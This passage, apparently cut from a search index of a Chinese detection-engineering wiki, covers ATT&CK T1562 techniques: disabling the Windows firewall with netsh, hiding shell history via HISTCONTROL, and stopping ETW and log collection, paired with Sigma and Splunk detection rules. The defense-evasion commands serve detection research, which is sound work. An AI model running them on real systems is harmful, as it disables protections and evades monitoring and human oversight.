https://attack.mitre.org/techniques/T1562/001/","title":"T1562-001-windows-\u505c\u6b62Windows\u9632\u5fa1\u670d\u52a1"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2windows%E9%98%B2%E5%BE%A1%E6%9C%8D%E5%8A%A1/#t1562-001-windows-windows","text":"","title":"T1562-001-windows-\u505c\u6b62Windows\u9632\u5fa1\u670d\u52a1"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2windows%E9%98%B2%E5%BE%A1%E6%9C%8D%E5%8A%A1/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u963b\u6b62\u7531\u76d1\u6d4b\u8f6f\u4ef6\u6216\u8fdb\u7a0b\u6355\u83b7\u5230\u7684\u544a\u8b66\uff0c\u4ee5\u53ca\u4e8b\u4ef6\u65e5\u5fd7\u88ab\u6536\u96c6\u548c\u5206\u6790\u3002\u8fd9\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\u6216\u6ce8\u518c\u8868\u9879\u4e2d\u7684\u76d1\u6d4b\u8f6f\u4ef6\u7684\u8bbe\u7f6e\uff0c\u4ee5\u8fbe\u5230\u9003\u907f\u8ffd\u8e2a\u7684\u76ee\u7684\u3002 \u95f4\u8c0d\u8f6f\u4ef6\u548c\u6076\u610f\u8f6f\u4ef6\u4ecd\u7136\u662f\u4e00\u4e2a\u4e25\u91cd\u7684\u95ee\u9898\uff0c\u5fae\u8f6f\u5f00\u53d1\u4e86\u5b89\u5168\u670d\u52a1\u5373Windows Defender\u548cWindows\u9632\u706b\u5899\uff0c\u534f\u52a9\u7528\u6237\u5bf9\u6297\u8fd9\u79cd\u5a01\u80c1\u3002\u5982\u679c\u5173\u95edWindows Defender\u6216Windows\u9632\u706b\u5899\uff0c\u5e94\u5f53\u5f15\u8d77\u7ba1\u7406\u5458\u7684\u6ce8\u610f\uff0c\u7acb\u5373\u6062\u590dwindows Defender\u6216windows\u9632\u706b\u5899\uff0c\u4f7f\u5176\u5904\u4e8e\u6b63\u5e38\u5de5\u4f5c\u72b6\u6001\uff0c\u8c03\u67e5\u5e76\u786e\u5b9a\u5f02\u5e38\u60c5\u51b5\u662f\u5426\u7531\u7528\u6237\u6b63\u5e38\u64cd\u4f5c\u5f15\u8d77\u7684\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2windows%E9%98%B2%E5%BE%A1%E6%9C%8D%E5%8A%A1/#_1","text":"windows 7 DOS\u547d\u4ee4\u5173\u95edwindows\u9632\u706b\u5899\uff1anetsh advfilewall set publicprofile state off","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2windows%E9%98%B2%E5%BE%A1%E6%9C%8D%E5%8A%A1/#_2","text":"windows system","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2windows%E9%98%B2%E5%BE%A1%E6%9C%8D%E5%8A%A1/#_3","text":"windows\u5173\u95ed\u9632\u706b\u5899\u7684\u65b9\u6cd5\u6709\u5f88\u591a\uff0c\u4f46\u4e8b\u4ef6ID\u53ea\u6709\u4e00\u4e2a\u3002 net start mpssvc netsh advfilewall set publicprofile state off","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2windows%E9%98%B2%E5%BE%A1%E6%9C%8D%E5%8A%A1/#_4","text":"windows system\u4e8b\u4ef6ID7036","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2windows%E9%98%B2%E5%BE%A1%E6%9C%8D%E5%8A%A1/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2windows%E9%98%B2%E5%BE%A1%E6%9C%8D%E5%8A%A1/#sigma","text":"title: \u505c\u6b62Windows\u9632\u5fa1\u670d\u52a1 description: win7 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c status: experimental author: 12306Bro logsource: \u200b product: windows \u200b service: system detection: \u200b selection: \u200b EventID: 7036 \u200b Message: 'Windows Firewall \u670d\u52a1\u5904\u4e8e \u505c\u6b62 \u72b6\u6001\u3002' \u200b condition: selection level: medium","title":"sigma\u89c4\u5219"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2windows%E9%98%B2%E5%BE%A1%E6%9C%8D%E5%8A%A1/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2windows%E9%98%B2%E5%BE%A1%E6%9C%8D%E5%8A%A1/#_7","text":"MITRE-ATT&CK-T1562-001 https://attack.mitre.org/techniques/T1562/001/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-003-linux-Histcontrol/","text":"T1562-003-linux-Histcontrol \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u5728HISTCONTROL\u73af\u5883\u53d8\u91cf\u51b3\u5b9a\u4e86\u662f\u5426\u4fdd\u5b58history\u547d\u4ee4\uff0c\u5e76\u6700\u7ec8\u8fdb\u5165~/.bash_history\u7528\u6237\u767b\u5f55\u65f6\u51fa\u7684\u6587\u4ef6\u3002\u53ef\u4ee5\u5c06\u6b64\u8bbe\u7f6e\u914d\u7f6e\u4e3a\u5ffd\u7565\u4ee5\u7a7a\u683c\u5f00\u5934\u7684\u547d\u4ee4\uff0c\u53ea\u9700\u5c06\u5176\u8bbe\u7f6e\u4e3a\u201cignorespace\u201d\u5373\u53ef\u3002HISTCONTROL\u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u4e3a\u5ffd\u7565\u91cd\u590d\u547d\u4ee4\uff0c\u5176\u4f7f\u7528\u65b9\u6cd5\u662f\u5c06\u5176\u8bbe\u7f6e\u4e3a\u201cignoredups\u201d\u3002\u5728\u67d0\u4e9bLinux\u7cfb\u7edf\u4e2d\uff0c\u9ed8\u8ba4\u8bbe\u7f6e\u4e3a\u201cignoreboth\u201d\uff0c\u5b83\u6db5\u76d6\u4e86\u524d\u9762\u7684\u4e24\u4e2a\u793a\u4f8b\u3002\u8fd9\u610f\u5473\u7740\u201cls\u201d\u5c06\u4e0d\u4f1a\u88ab\u4fdd\u5b58\uff0c\u4f46\u201cls\u201d\u5c06\u88ab\u5386\u53f2\u4fdd\u5b58\u3002HISTCONTROL\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5728macOS\u4e0a\u4e0d\u5b58\u5728\uff0c\u4f46\u53ef\u4ee5\u7531\u7528\u6237\u8bbe\u7f6e\u5e76\u4e14\u5c06\u53d7\u5230\u4fdd\u62a4\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u7b80\u5355\u7684\u5728\u5176\u6240\u6709\u7ec8\u7aef\u547d\u4ee4\u4e4b\u524d\u6dfb\u52a0\u7a7a\u683c\u6765\u4f7f\u7528\u5b83\u8fdb\u884c\u64cd\u4f5c\u64cd\u4f5c\u800c\u4e0d\u7559\u4e0b\u75d5\u8ff9\u3002 \u6d4b\u8bd5\u6848\u4f8b export HISTCONTROL=ignoreboth \u68c0\u6d4b\u65e5\u5fd7 bash\u5386\u53f2\u8bb0\u5f55 \u6d4b\u8bd5\u590d\u73b0 icbc@icbc:/$ ls icbc@icbc:/$ history 1 ls icbc@icbc:/$ export HISTCONTROL=ignoreboth icbc@icbc:/$ ls \u6d4b\u8bd5\u7559\u75d5 icbc@icbc:/$ history 1 ls 2 export HISTCONTROL=ignoreboth 3 history \u68c0\u6d4b\u89c4\u5219/\u601d\u8def splunk\u89c4\u5219 index=linux sourcetype=\"bash_history\" export HISTCONTROL | table host, user_name, bash_command \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1562-003 https://attack.mitre.org/techniques/T1562/003/ linux history\u547d\u4ee4\u8be6\u89e3 https://www.cnblogs.com/keithtt/p/7040549.html","title":"T1562-003-linux-Histcontrol"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-003-linux-Histcontrol/#t1562-003-linux-histcontrol","text":"","title":"T1562-003-linux-Histcontrol"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-003-linux-Histcontrol/#attck","text":"\u5728HISTCONTROL\u73af\u5883\u53d8\u91cf\u51b3\u5b9a\u4e86\u662f\u5426\u4fdd\u5b58history\u547d\u4ee4\uff0c\u5e76\u6700\u7ec8\u8fdb\u5165~/.bash_history\u7528\u6237\u767b\u5f55\u65f6\u51fa\u7684\u6587\u4ef6\u3002\u53ef\u4ee5\u5c06\u6b64\u8bbe\u7f6e\u914d\u7f6e\u4e3a\u5ffd\u7565\u4ee5\u7a7a\u683c\u5f00\u5934\u7684\u547d\u4ee4\uff0c\u53ea\u9700\u5c06\u5176\u8bbe\u7f6e\u4e3a\u201cignorespace\u201d\u5373\u53ef\u3002HISTCONTROL\u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u4e3a\u5ffd\u7565\u91cd\u590d\u547d\u4ee4\uff0c\u5176\u4f7f\u7528\u65b9\u6cd5\u662f\u5c06\u5176\u8bbe\u7f6e\u4e3a\u201cignoredups\u201d\u3002\u5728\u67d0\u4e9bLinux\u7cfb\u7edf\u4e2d\uff0c\u9ed8\u8ba4\u8bbe\u7f6e\u4e3a\u201cignoreboth\u201d\uff0c\u5b83\u6db5\u76d6\u4e86\u524d\u9762\u7684\u4e24\u4e2a\u793a\u4f8b\u3002\u8fd9\u610f\u5473\u7740\u201cls\u201d\u5c06\u4e0d\u4f1a\u88ab\u4fdd\u5b58\uff0c\u4f46\u201cls\u201d\u5c06\u88ab\u5386\u53f2\u4fdd\u5b58\u3002HISTCONTROL\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5728macOS\u4e0a\u4e0d\u5b58\u5728\uff0c\u4f46\u53ef\u4ee5\u7531\u7528\u6237\u8bbe\u7f6e\u5e76\u4e14\u5c06\u53d7\u5230\u4fdd\u62a4\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u7b80\u5355\u7684\u5728\u5176\u6240\u6709\u7ec8\u7aef\u547d\u4ee4\u4e4b\u524d\u6dfb\u52a0\u7a7a\u683c\u6765\u4f7f\u7528\u5b83\u8fdb\u884c\u64cd\u4f5c\u64cd\u4f5c\u800c\u4e0d\u7559\u4e0b\u75d5\u8ff9\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-003-linux-Histcontrol/#_1","text":"export HISTCONTROL=ignoreboth","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-003-linux-Histcontrol/#_2","text":"bash\u5386\u53f2\u8bb0\u5f55","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-003-linux-Histcontrol/#_3","text":"icbc@icbc:/$ ls icbc@icbc:/$ history 1 ls icbc@icbc:/$ export HISTCONTROL=ignoreboth icbc@icbc:/$ ls","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-003-linux-Histcontrol/#_4","text":"icbc@icbc:/$ history 1 ls 2 export HISTCONTROL=ignoreboth 3 history","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-003-linux-Histcontrol/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-003-linux-Histcontrol/#splunk","text":"index=linux sourcetype=\"bash_history\" export HISTCONTROL | table host, user_name, bash_command","title":"splunk\u89c4\u5219"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-003-linux-Histcontrol/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-003-linux-Histcontrol/#_7","text":"MITRE-ATT&CK-T1562-003 https://attack.mitre.org/techniques/T1562/003/ linux history\u547d\u4ee4\u8be6\u89e3 https://www.cnblogs.com/keithtt/p/7040549.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-006-win-%E5%81%9C%E6%AD%A2%E6%97%A5%E5%BF%97%E9%87%87%E9%9B%86/","text":"T1562-006-windows-\u505c\u6b62\u65e5\u5fd7\u91c7\u96c6 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u963b\u6b62\u901a\u5e38\u7531\u4f20\u611f\u5668\uff08\u53ef\u7406\u89e3\u4e3awindows\u65e5\u5fd7\u5ba1\u6838\u7b56\u7565\uff09\u6355\u83b7\u7684\u6307\u6807\uff08\u53ef\u7406\u89e3\u4e3a\u544a\u8b66\uff09\u6216\u4e8b\u4ef6\u88ab\u6536\u96c6\u548c\u5206\u6790\u3002\u8fd9\u53ef\u80fd\u5305\u62ec\u6076\u610f\u7be1\u6539\u6216\u901a\u8fc7\u7be1\u6539\u63a7\u5236\u4e8b\u4ef6\u9065\u6d4b\u6536\u96c6\u548c\u6d41\u7a0b\u7684\u8bbe\u7f6e\u6765\u7981\u7528\u57fa\u4e8e\u4e3b\u673a\u7684\u4f20\u611f\u5668\uff0c\u4f8b\u5982Windows\u4e8b\u4ef6\u8ddf\u8e2a\uff08ETW\uff09\u3002 \u8fd9\u4e9b\u8bbe\u7f6e\u53ef\u4ee5\u5b58\u50a8\u5728\u7cfb\u7edf\u4e2d\u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\u6216\u6ce8\u518c\u8868\u4e2d\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u7ba1\u7406\u5b9e\u7528\u7a0b\u5e8f\uff08\u4f8b\u5982PowerShell\u6216Windows Management Instrumentation\uff09\u8fdb\u884c\u8bbf\u95ee\u3002 \u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u5b9e\u73b0ETW\u4e2d\u65ad\uff0c\u4f46\u662f\u6700\u76f4\u63a5\u7684\u65b9\u6cd5\u662f\u4f7f\u7528PowerShell Set-EtwTraceProvider cmdlet\u5b9a\u4e49\u6761\u4ef6\uff0c\u6216\u8005\u76f4\u63a5\u5bf9\u6ce8\u518c\u8868\u8fdb\u884c\u66f4\u6539\u3002 \u5728\u57fa\u4e8e\u7f51\u7edc\u7684\u6307\u6807\u62a5\u544a\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u963b\u6b62\u4e0e\u62a5\u544a\u76f8\u5173\u7684\u6d41\u91cf\uff0c\u4ee5\u9632\u6b62\u8fdb\u884c\u96c6\u4e2d\u5206\u6790\u3002\u8fd9\u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u6765\u5b8c\u6210\uff0c\u4f8b\u5982\u505c\u6b62\u8d1f\u8d23\u8f6c\u53d1\u6570\u636e\u7684\u672c\u5730\u8fdb\u7a0b\u6216\u521b\u5efa\u57fa\u4e8e\u4e3b\u673a\u7684\u9632\u706b\u5899\u89c4\u5219\u4ee5\u963b\u6b62\u6d41\u91cf\u6d41\u5411\u8d1f\u8d23\u6c47\u603b\u4e8b\u4ef6\u7684\u7279\u5b9a\u4e3b\u673a\uff0c\u4f8b\u5982\u5b89\u5168\u4fe1\u606f\u548c\u4e8b\u4ef6\u7ba1\u7406\uff08SIEM\uff09\u4ea7\u54c1\u3002 \u6ce8\u91ca\uff1aETW\u662fEvent Tracing for Windows\u7684\u7b80\u79f0\uff0c\u5b83\u662fWindows\u63d0\u4f9b\u7684\u539f\u751f\u7684\u4e8b\u4ef6\u8ddf\u8e2a\u65e5\u5fd7\u7cfb\u7edf\u3002\u7531\u4e8e\u91c7\u7528\u5185\u6838\uff08Kernel\uff09\u5c42\u9762\u7684\u7f13\u51b2\u548c\u65e5\u5fd7\u8bb0\u5f55\u673a\u5236\uff0c\u6240\u4ee5ETW\u63d0\u4f9b\u4e86\u4e00\u79cd\u975e\u5e38\u9ad8\u6548\u7684\u4e8b\u4ef6\u8ddf\u8e2a\u65e5\u5fd7\u89e3\u51b3\u65b9\u6848\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6682\u65e0\u6d4b\u8bd5\u6848\u4f8b\uff0c\u53ef\u53c2\u8003\u5176\u4ed6\u6848\u4f8b\uff0c\u5173\u505c\u65e5\u5fd7\u8f6c\u53d1\u6216\u66f4\u6539\u65e5\u5fd7\u91c7\u96c6\u7b56\u7565 \u68c0\u6d4b\u65e5\u5fd7 windows sysmon \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0\u6d4b\u8bd5\u6848\u4f8b\uff0c\u53ef\u53c2\u8003\u5176\u4ed6\u6848\u4f8b\uff0c\u5173\u505c\u65e5\u5fd7\u8f6c\u53d1\u6216\u66f4\u6539\u65e5\u5fd7\u91c7\u96c6\u7b56\u7565 \u6d4b\u8bd5\u7559\u75d5 windows sysmon \u68c0\u6d4b\u89c4\u5219/\u601d\u8def splunk\u89c4\u5219 \u4ece\u4e3b\u673a\u65e5\u5fd7\u8f6c\u53d1\u5668\u68c0\u6d4b\u5230\u7f3a\u5c11\u544a\u8b66\u6216\u8005\u65e5\u5fd7\u7684\u6d3b\u52a8\u3002\u4e0d\u540c\u7684\u963b\u6b62\u65b9\u6cd5\u53ef\u80fd\u4f1a\u5bfc\u81f4\u6293\u53d1\u4e2d\u65ad\u3002\u7cfb\u7edf\u53ef\u80fd\u7a81\u7136\u505c\u6b62\u62a5\u544a\u6240\u6709\u6570\u636e\u6216\u4ec5\u62a5\u544a\u67d0\u4e9b\u79cd\u7c7b\u7684\u6570\u636e\u3002 \u6839\u636e\u6536\u96c6\u5230\u7684\u4e3b\u673a\u4fe1\u606f\u7684\u7c7b\u578b\uff0c\u5206\u6790\u4eba\u5458\u53ef\u80fd\u80fd\u591f\u68c0\u6d4b\u5230\u89e6\u53d1\u4e86\u8fdb\u7a0b\u505c\u6b62\u6216\u8fde\u63a5\u88ab\u963b\u6b62\u7684\u4e8b\u4ef6\u3002\u4f8b\u5982\uff0cSysmon\u5c06\u5728\u5176\u914d\u7f6e\u72b6\u6001\u5df2\u66f4\u6539\uff08\u4e8b\u4ef6ID 16\uff09\u65f6\u8fdb\u884c\u8bb0\u5f55\uff0c\u5e76\u4e14Windows Management Instrumentation\uff08WMI\uff09\u53ef\u4ee5\u7528\u4e8e\u8ba2\u9605ETW\u63d0\u4f9b\u7a0b\u5e8f\uff0c\u8be5\u7a0b\u5e8f\u8bb0\u5f55\u4ece\u7279\u5b9a\u8ddf\u8e2a\u4f1a\u8bdd\u4e2d\u5220\u9664\u7684\u4efb\u4f55\u63d0\u4f9b\u7a0b\u5e8f\u3002\u8981\u68c0\u6d4bETW\u4e2d\u7684\u66f4\u6539\uff0c\u60a8\u8fd8\u53ef\u4ee5\u76d1\u89c6\u5305\u542b\u6240\u6709ETW\u4e8b\u4ef6\u63d0\u4f9b\u7a0b\u5e8f\u914d\u7f6e\u7684\u6ce8\u518c\u8868\u9879\uff1aHKLM\\SYSTEM\\CurrentControlSet\\Control\\WMI\\ Autologger\\AUTOLOGGER_NAME {{PROVIDER_GUID}} index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=16) OR (EventCode IN (12,13) TargetObject=\u201cHKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\WMI\\\\Autologger*\u201d) OR (EventCode=1 Image=\u201d*\\\\logman.exe\u201d CommandLine=\u201d*update trace*\u201d) OR (EventCode=1 Image=\u201d*\\\\wpr\u201d)//tampering Event Tracing in windows index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d*\\\\logman.exe\u201d CommandLine=\u201d*query*\u201d) OR (EventCode IN (12,13) TargetObject=\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\WINEVT\\\\Publishers*\u201d) // enumirating the ETW in windows with logman,exe \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1562-006 https://attack.mitre.org/techniques/T1562/006/ \u5982\u4f55\u5229\u7528ETW\uff08Event Tracing for Windows\uff09\u8bb0\u5f55\u65e5\u5fd7 https://www.cnblogs.com/artech/p/logging-via-etw.html","title":"T1562-006-windows-\u505c\u6b62\u65e5\u5fd7\u91c7\u96c6"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-006-win-%E5%81%9C%E6%AD%A2%E6%97%A5%E5%BF%97%E9%87%87%E9%9B%86/#t1562-006-windows-","text":"","title":"T1562-006-windows-\u505c\u6b62\u65e5\u5fd7\u91c7\u96c6"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-006-win-%E5%81%9C%E6%AD%A2%E6%97%A5%E5%BF%97%E9%87%87%E9%9B%86/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u963b\u6b62\u901a\u5e38\u7531\u4f20\u611f\u5668\uff08\u53ef\u7406\u89e3\u4e3awindows\u65e5\u5fd7\u5ba1\u6838\u7b56\u7565\uff09\u6355\u83b7\u7684\u6307\u6807\uff08\u53ef\u7406\u89e3\u4e3a\u544a\u8b66\uff09\u6216\u4e8b\u4ef6\u88ab\u6536\u96c6\u548c\u5206\u6790\u3002\u8fd9\u53ef\u80fd\u5305\u62ec\u6076\u610f\u7be1\u6539\u6216\u901a\u8fc7\u7be1\u6539\u63a7\u5236\u4e8b\u4ef6\u9065\u6d4b\u6536\u96c6\u548c\u6d41\u7a0b\u7684\u8bbe\u7f6e\u6765\u7981\u7528\u57fa\u4e8e\u4e3b\u673a\u7684\u4f20\u611f\u5668\uff0c\u4f8b\u5982Windows\u4e8b\u4ef6\u8ddf\u8e2a\uff08ETW\uff09\u3002 \u8fd9\u4e9b\u8bbe\u7f6e\u53ef\u4ee5\u5b58\u50a8\u5728\u7cfb\u7edf\u4e2d\u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\u6216\u6ce8\u518c\u8868\u4e2d\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u7ba1\u7406\u5b9e\u7528\u7a0b\u5e8f\uff08\u4f8b\u5982PowerShell\u6216Windows Management Instrumentation\uff09\u8fdb\u884c\u8bbf\u95ee\u3002 \u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u5b9e\u73b0ETW\u4e2d\u65ad\uff0c\u4f46\u662f\u6700\u76f4\u63a5\u7684\u65b9\u6cd5\u662f\u4f7f\u7528PowerShell Set-EtwTraceProvider cmdlet\u5b9a\u4e49\u6761\u4ef6\uff0c\u6216\u8005\u76f4\u63a5\u5bf9\u6ce8\u518c\u8868\u8fdb\u884c\u66f4\u6539\u3002 \u5728\u57fa\u4e8e\u7f51\u7edc\u7684\u6307\u6807\u62a5\u544a\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u963b\u6b62\u4e0e\u62a5\u544a\u76f8\u5173\u7684\u6d41\u91cf\uff0c\u4ee5\u9632\u6b62\u8fdb\u884c\u96c6\u4e2d\u5206\u6790\u3002\u8fd9\u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u6765\u5b8c\u6210\uff0c\u4f8b\u5982\u505c\u6b62\u8d1f\u8d23\u8f6c\u53d1\u6570\u636e\u7684\u672c\u5730\u8fdb\u7a0b\u6216\u521b\u5efa\u57fa\u4e8e\u4e3b\u673a\u7684\u9632\u706b\u5899\u89c4\u5219\u4ee5\u963b\u6b62\u6d41\u91cf\u6d41\u5411\u8d1f\u8d23\u6c47\u603b\u4e8b\u4ef6\u7684\u7279\u5b9a\u4e3b\u673a\uff0c\u4f8b\u5982\u5b89\u5168\u4fe1\u606f\u548c\u4e8b\u4ef6\u7ba1\u7406\uff08SIEM\uff09\u4ea7\u54c1\u3002 \u6ce8\u91ca\uff1aETW\u662fEvent Tracing for Windows\u7684\u7b80\u79f0\uff0c\u5b83\u662fWindows\u63d0\u4f9b\u7684\u539f\u751f\u7684\u4e8b\u4ef6\u8ddf\u8e2a\u65e5\u5fd7\u7cfb\u7edf\u3002\u7531\u4e8e\u91c7\u7528\u5185\u6838\uff08Kernel\uff09\u5c42\u9762\u7684\u7f13\u51b2\u548c\u65e5\u5fd7\u8bb0\u5f55\u673a\u5236\uff0c\u6240\u4ee5ETW\u63d0\u4f9b\u4e86\u4e00\u79cd\u975e\u5e38\u9ad8\u6548\u7684\u4e8b\u4ef6\u8ddf\u8e2a\u65e5\u5fd7\u89e3\u51b3\u65b9\u6848\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-006-win-%E5%81%9C%E6%AD%A2%E6%97%A5%E5%BF%97%E9%87%87%E9%9B%86/#_1","text":"\u6682\u65e0\u6d4b\u8bd5\u6848\u4f8b\uff0c\u53ef\u53c2\u8003\u5176\u4ed6\u6848\u4f8b\uff0c\u5173\u505c\u65e5\u5fd7\u8f6c\u53d1\u6216\u66f4\u6539\u65e5\u5fd7\u91c7\u96c6\u7b56\u7565","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-006-win-%E5%81%9C%E6%AD%A2%E6%97%A5%E5%BF%97%E9%87%87%E9%9B%86/#_2","text":"windows sysmon","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-006-win-%E5%81%9C%E6%AD%A2%E6%97%A5%E5%BF%97%E9%87%87%E9%9B%86/#_3","text":"\u6682\u65e0\u6d4b\u8bd5\u6848\u4f8b\uff0c\u53ef\u53c2\u8003\u5176\u4ed6\u6848\u4f8b\uff0c\u5173\u505c\u65e5\u5fd7\u8f6c\u53d1\u6216\u66f4\u6539\u65e5\u5fd7\u91c7\u96c6\u7b56\u7565","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-006-win-%E5%81%9C%E6%AD%A2%E6%97%A5%E5%BF%97%E9%87%87%E9%9B%86/#_4","text":"windows sysmon","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-006-win-%E5%81%9C%E6%AD%A2%E6%97%A5%E5%BF%97%E9%87%87%E9%9B%86/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-006-win-%E5%81%9C%E6%AD%A2%E6%97%A5%E5%BF%97%E9%87%87%E9%9B%86/#splunk","text":"\u4ece\u4e3b\u673a\u65e5\u5fd7\u8f6c\u53d1\u5668\u68c0\u6d4b\u5230\u7f3a\u5c11\u544a\u8b66\u6216\u8005\u65e5\u5fd7\u7684\u6d3b\u52a8\u3002\u4e0d\u540c\u7684\u963b\u6b62\u65b9\u6cd5\u53ef\u80fd\u4f1a\u5bfc\u81f4\u6293\u53d1\u4e2d\u65ad\u3002\u7cfb\u7edf\u53ef\u80fd\u7a81\u7136\u505c\u6b62\u62a5\u544a\u6240\u6709\u6570\u636e\u6216\u4ec5\u62a5\u544a\u67d0\u4e9b\u79cd\u7c7b\u7684\u6570\u636e\u3002 \u6839\u636e\u6536\u96c6\u5230\u7684\u4e3b\u673a\u4fe1\u606f\u7684\u7c7b\u578b\uff0c\u5206\u6790\u4eba\u5458\u53ef\u80fd\u80fd\u591f\u68c0\u6d4b\u5230\u89e6\u53d1\u4e86\u8fdb\u7a0b\u505c\u6b62\u6216\u8fde\u63a5\u88ab\u963b\u6b62\u7684\u4e8b\u4ef6\u3002\u4f8b\u5982\uff0cSysmon\u5c06\u5728\u5176\u914d\u7f6e\u72b6\u6001\u5df2\u66f4\u6539\uff08\u4e8b\u4ef6ID 16\uff09\u65f6\u8fdb\u884c\u8bb0\u5f55\uff0c\u5e76\u4e14Windows Management 